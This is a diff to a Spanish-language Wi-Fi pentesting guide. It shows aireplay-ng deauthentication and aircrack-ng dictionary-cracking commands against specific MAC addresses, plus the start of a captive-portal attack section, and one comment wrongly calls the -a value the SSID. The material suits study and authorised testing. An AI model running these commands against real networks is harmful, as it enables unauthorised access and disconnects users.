@@ -414,7 +414,7 @@ Cuando el handshake es capturado se guardará en el directorio en donde estás s
 ### Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake. (Simultáneamente)
 `aireplay-ng --deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon # donde -a es el SSID y -c es el cliente.`
 
-O podés hacerlo sin el cliente `sin la opción -c`
+O podés hacerlo sin el cliente `sin la opción -c` pero agregando `-D` 
 
 ### Una vez que capturamos el handshake, intentamos descubrir la contraseña usando un diccionario.
 `aircrack-ng handshake.cap -w passwords.txt`
@@ -431,6 +431,7 @@ service network-manager start
 
 
 ### Ataque de deautenticacion y portal cautivo.
+
 ```bash
 sudo su
 service network-manager stop
